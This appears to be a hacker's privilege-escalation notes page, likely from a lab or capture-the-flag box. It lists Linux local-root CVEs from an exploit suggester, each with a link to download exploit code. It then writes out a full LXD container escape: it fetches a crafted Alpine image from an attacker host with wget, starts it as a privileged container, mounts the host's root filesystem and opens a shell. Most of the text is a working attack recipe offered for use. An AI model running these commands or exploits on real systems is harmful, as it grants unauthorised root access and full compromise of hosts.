Hacking itself is THINKING OUTSIDE THE BOX

​

​

[+] [CVE-2021-3156] sudo Baron Samedit

​

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt

   Exposure: probable

   Tags: mint=19,[ ubuntu=18|20 ], debian=10

   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

​

[+] [CVE-2021-3156] sudo Baron Samedit 2

​

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt

   Exposure: probable

   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10

   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

​

[+] [CVE-2018-18955] subuid_shell

​

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712

   Exposure: probable

   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}

   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip

   Comments: CONFIG_USER_NS needs to be enabled

​

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

​

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/

https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/

   Exposure: less probable

   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}

   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c

   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

​

[+] [CVE-2022-2586] nft_object UAF

​

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5

   Exposure: less probable

   Tags: ubuntu=(20.04){kernel:5.12.13}

   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1

   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

​

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

​

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html

   Exposure: less probable

   Tags: ubuntu=20.04{kernel:5.8.0-*}

   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c

   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c

   Comments: ip_tables kernel module must be loaded

​

[+] [CVE-2019-18634] sudo pwfeedback

​

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/

   Exposure: less probable

   Tags: mint=19

   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c

   Comments: sudo configuration requires pwfeedback to be enabled.

​

[+] [CVE-2019-15666] XFRM_UAF

​

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc

   Exposure: less probable

   Download URL: 

   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

​

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

​

   Details: https://seclists.org/oss-sec/2017/q1/184

   Exposure: less probable

   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

​

​

​

alpine-v3.13-x86_64-20210218_0139.tar.gz

​

python3 -m http.server

wget http://10.10.4.60:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

​

cd ~/lxd-alpine-builder

python3 -m http.server

wget http://10.10.4.60:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

​

lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

lxc init myimage mycontainer -c security.privileged=true

lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

lxc start mycontainer

lxc exec mycontainer /bin/sh

cd /mnt/root

​
